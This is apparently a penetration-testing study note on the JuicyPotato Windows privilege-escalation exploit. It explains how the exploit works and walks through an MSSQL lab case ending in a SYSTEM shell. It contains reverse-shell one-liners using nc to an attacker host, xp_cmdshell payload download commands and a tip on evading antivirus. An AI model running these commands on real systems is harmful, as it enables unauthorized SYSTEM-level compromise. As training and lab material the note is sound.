---
created: 2026-07-20
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
## JuicyPotato

> **[JuicyPotato](https://github.com/ohpe/juicy-potato)** is a local privilege escalation exploit that abuses the Windows COM activation infrastructure to escalate from a **service account with `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`** to **`NT AUTHORITY\SYSTEM`**.

> [!warning]+ Compatibility
> - Works on Windows **up to Windows 10 `1803` / Windows Server 2016**.
> - **Mitigated** starting from Windows 10 `1809` / Windows Server 2019.
> - For newer builds, use **PrintSpoofer**, **RoguePotato**, **GodPotato**, or other alternatives.

- Attempt JuicyPotato if:
	- You have code execution as a **service account** (IIS AppPool, MSSQL service, etc.) or any account with **`SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`**.
	- The target is running Windows **Server 2016 or older** (or Windows 10 build **≤ `1803`**).
	- You can write/upload an exploit and execute it.

- Verify current privileges:

```powershell
whoami /priv
```

- Look for either `SeImpersonatePrivilege` (most common) or `SeAssignPrimaryTokenPrivilege`; counts even if the state shows `Disabled`.

>[!note] See [[🛠️ Windows privileges#`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`]] for more on these two privileges, including which accounts hold them by default.

- Check Windows OS version and build:

```powershell
wmic os get Caption,Version,BuildNumber,OSArchitecture
```

```powershell
Get-ComputerInfo | Select-Object OSName, OSDisplayVersion, OSVersion, WindowsEditionId, WindowsProductName
```

>[!note] See [[Windows enumeration]].
## How JuicyPotato works

JuicyPotato chains four steps to get from a service account to `SYSTEM`:

1. **Start a fake COM server**
	- JuicyPotato binds a local TCP port (say, `1337`) and registers itself as a DCOM/RPC endpoint, pretending to be a legitimate COM server for the chosen CLSID.

>[!note] The exploit **doesn't actually implement a COM object**; it only needs to appear to Windows as the endpoint that should receive COM activation traffic.

2. **Trigger COM activation**
	- JuicyPotato calls `CoGetInstanceFromIStorage()` (a standard COM activation API) to request an instance of the target CLSID. This normally asks Windows to create a COM object identified by a CLSID.
	- Instead of sending a normal activation request, JuicyPotato supplies a **custom marshaled object reference (`OBJREF`)**. That `OBJREF` contains an endpoint **pointing to the JuicyPotato's own fake listener** (e.g., `127.0.0.1:1337`).
	- The request is handled by **RPCSS**, a `SYSTEM`-level service responsible for COM activation. `RPCSS` trusts the information inside the activation request, looks up the CLSID, and attempts to contact the endpoint specified by the `OBJREF` (which is JuicyPotato itself).

>[!Note] JuicyPotato does not connect to RPCSS. RPCSS connects to JuicyPotato.

>[!note] See [[🛠️ COM, DCOM, and RPC]] to learn about COM activation, CLSID, `RPCSS`, and the DCOM protocol.

3. **`RPCSS` authenticates as `SYSTEM`**
	- Before `RPCSS` talks to the endpoint, Windows authenticates the connection.
	- Since `RPCSS` runs as `SYSTEM`, the authentication is also performed using the `SYSTEM` account.
	- JuicyPotato captures the three-message NTLM exchange from `RPCSS` (it receives all three because it acts as the server):
		1. `NEGOTIATE_MESSAGE`
		2. `CHALLENGE_MESSAGE`
		3. `AUTHENTICATE_MESSAGE`
	- At this point, JuicyPotato has successfully caused a `SYSTEM` process to authenticate to it.
	- At this point JuicyPotato holds a complete `SYSTEM`-level NTLM authentication blob.

>[!important] `RPCSS` authenticates to JuicyPotato's fake listener as `SYSTEM` **because COM/DCOM requires authenticated RPC connections**, and **`RPCSS` is the one initiating the connection**.

4. **Turn the authentication into a `SYSTEM` (impersonation) token**
	- Now JuicyPotato needs to get an access token from the captured NTML exchange. To make this happen, it performs an **HTML reflection attack**.
	- It creates a **named pipe server** and reuses (replays) the captured NTLM authentication during a new local authentication. LSASS verifies the NTLM authentication and recognizes that it represents the `SYSTEM` account. 
	- JuicyPotato then calls `ImpersonateNamedPipeClient()` which tells Windows to **make the current thread execute using the security context of the client connected to the named pipe**.
	- Since that client authenticated as `SYSTEM`, the thread now receives a `SYSTEM` **impersonation token**.

> [!note] See [[🛠️ Named pipes]] for how named pipe impersonation works.

5. **Convert the token into a `SYSTEM` process**
	- The obtained token is an **impersonation token**. An impersonation token lets the current thread act as another user, but it **can't directly be used to start a new process**.
	- JuicyPotato therefore calls `DuplicateTokenEx()` to create a **primary token** (needed to spawn new processes with the security context of that token).
	- Finally, JuicyPotato launches the payload using either:
		- `CreateProcessWithTokenW()` (requires `SeImpersonatePrivilege`), or
		- `CreateProcessAsUser()` (requires `SeAssignPrimaryTokenPrivilege`).
	- The new process starts with the duplicated primary token and therefore runs as `NT AUTHORITY\SYSTEM`.

> [!note] See [[🛠️ Access tokens and impersonation]] for the difference between primary and impersonation tokens.
### CLSID selection

- The CLSID determines **which COM class Windows tries to activate**.
- Not every COM class works.
- The chosen class must:
	- run under `SYSTEM` (or another privileged account),
	- support the COM features JuicyPotato abuses (particularly custom marshaling through `IMarshal` that allows JuicyPotato to inject a custom `OBJREF`),
	- be able to activate from the current user session.
- If any of these conditions are not met, `RPCSS` will never perform the privileged authentication, and the exploit fails.

> [!important] The full CLSID list per OS version is at [`juicy-potato — ohpe.it`](https://ohpe.it/juicy-potato/CLSID/). If the default CLSID fails, try others from that list matching your target OS.

## Exploitation

- Get the **[JuicyPotato exploit](https://github.com/ohpe/juicy-potato)**:

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

>[!note] See [releases](https://github.com/ohpe/juicy-potato/releases).

- Spawn a `cmd.exe` as `SYSTEM`:

```powershell
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

- Reverse shell:

```bash
JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c nc.exe <attacker_ip> <port> -e cmd.exe" -c {CLSID}
```

- Test a CLSID without executing payload:

```powershell
JuicyPotato.exe -z -l 1337 -c {CLSID}
```

### Option reference

| Option          | Description                                                             |
| --------------- | ----------------------------------------------------------------------- |
| `-t` (required) | Token creation method (`t`, `u`, or `*`).                               |
| `-p` (required) | Program to launch as `SYSTEM` (e.g., `C:\Windows\System32\cmd.exe`).    |
| `-l` (required) | Local port for the fake COM/RPC listener (use any port above `1024`).   |
| `-a`            | Arguments passed to `-p` (e.g., `-a "/c whoami"`).                      |
| `-c`            | CLSID of the COM object to abuse. <br>Omit to use the built-in default. |
| `-m`            | Address the fake COM server listens on (default: `127.0.0.1`).          |
| `-k`            | RPC server address (default: `127.0.0.1`).                              |
| `-z`            | Test mode — validates the CLSID without executing the payload.          |

- `-t` arguments:

| Value | API used                    | Requires                        |
| ----- | --------------------------- | ------------------------------- |
| `t`   | `CreateProcessWithTokenW()` | `SeImpersonatePrivilege`        |
| `u`   | `CreateProcessAsUserW()`    | `SeAssignPrimaryTokenPrivilege` |
| `*`   | Try both.                   | Either privilege.               |

> [!tip] Always start with `-t *` to try both methods automatically.

>[!tip]+ Troubleshooting
>  - `authresult` is non-zero (e.g., `5`) -> The CLSID is not usable from your session. Try a different one from the [CLSID list](https://ohpe.it/juicy-potato/CLSID/).
>  - `CreateProcessWithTokenW` fails, `CreateProcessAsUserW` also fails -> Confirm both privileges are present. Try running from a different shell or process. 
>  - Port already in use -> Change the `-l` port to another value above `1024`.
>  - Antivirus blocks the binary -> Rename the binary, use a different download path, or use an obfuscated variant.
### MSSQL example

>[!note] This walkthrough covers the full path from SQL Server code execution to a `SYSTEM` shell via JuicyPotato.

Suppose you've gained a foothold on an SQL Server. The SQL service account has `SeImpersonatePrivilege`. To exploit JuicyPotato and get `SYSTEM`:

1. **Connect to the SQL Server instance, such as using [Impacket](https://github.com/fortra/impacket)'s [`mssqlclient.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)**:

```bash
mssqlclient.py <username>@<target> -windows-auth
```

>[!example]-
> ```bash
> mssqlclient.py sql_dev@10.129.37.97 -windows-auth
> ```
> 
> ```bash
> Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
> 
> Password: # Str0ng_P@ssw0rd!
> [*] Encryption required, switching to TLS
> [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
> [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
> [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
> [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
> [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
> [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
> [!] Press help for extra shell commands
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
> ```

2. **Enable the `xp_cmdshell` stored procedure to run OS commands**:

```sql
enable_xp_cmdshell
```

>[!note]+ `enable_xp_cmdshell` is the Impacket's shortcut. Manual alternative:
> ```sql
> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
> ```

>[!example]-
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
> ```
> 
> ```bash
> INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
> INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
> ```

3. **Confirm code execution and verify `SeImpersonatePrivilege`**:

```bash
xp_cmdshell whoami
xp_cmdshell whoami /priv
```

>[!note] The user will be something like `nt service\mssql$sqlexpress`. Make sure `SeImpersonatePrivilege` is present in `whoami /priv` output (even if `Disabled`).

>[!example]-
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami
> ```
> 
> ```bash
> output                          
> -----------------------------   
> nt service\mssql$sqlexpress01   
> 
> NULL 
> ```
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami /priv
> ```
> 
> ```bash
> output                                                                             
> --------------------------------------------------------------------------------   
> NULL                                                                               
> PRIVILEGES INFORMATION                                                             
> ----------------------                                                             
> NULL                                                                               
> Privilege Name                Description                               State      
> ============================= ========================================= ========   
> SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
> SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
> SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
> SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
> SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
> SeCreateGlobalPrivilege       Create global objects                     Enabled    
> SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
> 
> NULL    
> ```

5. **Transfer the [exploit](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) to the target**:

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
python3 -m http.server 8080
```

```bash
SQL> xp_cmdshell powershell -c "Invoke-WebRequest -Uri http://<attacker_ip_address>:8080/JuicyPotato.exe -OutFile C:\Windows\Temp\JuicyPotato.exe"
```

7. **On your attacker host, set up a listener for a reverse shell**:

```bash
sudo nc -lnvp 1337
```

8. **Run JuicyPotato to create a reverse shell**:

```sql
xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\nc.exe <attacker> 1337 -e cmd.exe" -t *
```

>[!example]-
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\nc.exe 10.10.14.111 1337 -e cmd.exe" -t *
> ```
> 
> ```bash
> output                                                       
> ----------------------------------------------------------   
> Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         
> ......                                                       
> 
> [+] authresult 0                                             
> {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   
> 
> NULL                                                         
> 
> [+] CreateProcessWithTokenW OK                               
> [+] calling 0x000000000088ce08                               
> 
> NULL    
> ```

9. **Catch the `SYSTEM` shell**.

>[!example]-
> ```
> listening on [any] 1337 ...
> connect to [10.10.14.111] from (UNKNOWN) [10.129.37.97] 49801
> Microsoft Windows [Version 10.0.14393]
> (c) 2016 Microsoft Corporation. All rights reserved.
> 
> C:\Windows\system32> whoami
> whoami
> nt authority\system
> ```

## What changed after JuicyPotato

- Starting with **Windows 10 `1809`** and **Windows Server 2019**, Microsoft hardened the local OXID resolution path inside `RPCSS`. The key change:
	- `RPCSS` no longer allows COM activation traffic on arbitrary local TCP ports. The underlying connection from `RPCSS` to the COM server is now **restricted to TCP port `135`** only (binding to ports under `1024` requires administrator privileges).
	- Since JuicyPotato's fake COM server listens on an arbitrary high port (e.g., `1337`), `RPCSS` refuses to connect to it. The exploit's core trick — redirecting `RPCSS` to a fake listener via a custom `OBJREF` — no longer works.
- This single restriction rendered JuicyPotato **ineffective** on all modern Windows builds. 
- Several successor techniques bypass this mitigation through different approaches:
	- [[PrintSpoofer]]: Coerces the Print Spooler (`spoolsv.exe`, `SYSTEM`) into connecting to a named pipe via the MS-RPRN interface; doesn't use COM/DCOM at all.
	- [[RoguePotato]]: Redirects OXID resolution to a remote machine running a fake OXID Resolver, which returns poisoned named pipe bindings back to the victim.
	- [[GodPotato]]: Exploits a different DCOM/RPCSS activation path that bypasses the port restriction and the `rpcss.dll` string binding changes. Works across all modern builds.

- [[SweetPotato]] is an all-in-one tool that combines multiple techniques (DCOM/NTLM reflection on older builds, BITS/WinRM abuse on newer ones).

> [!note] See [[🛠️ COM, DCOM, and RPC#OXID resolution]] for the OXID resolution mechanism and why the port restriction breaks JuicyPotato.

## References and further reading

- [`JuicyPotato — GitHub (ohpe)`](https://github.com/ohpe/juicy-potato)
- [`CLSID list per OS — ohpe.it`](https://ohpe.it/juicy-potato/CLSID/)
- [`JuicyPotato — HackTricks`](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/juicypotato.html)
- [`Rotten Potato — Privilege Escalation from Service Accounts to SYSTEM — Fox-IT`](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- [`Potatoes — Windows Privilege Escalation — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [`Impersonate a client after authentication — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)
- [`Potatoes and tokens — Decoder's Blog`](https://decoder.cloud/2018/01/13/potato-and-tokens/).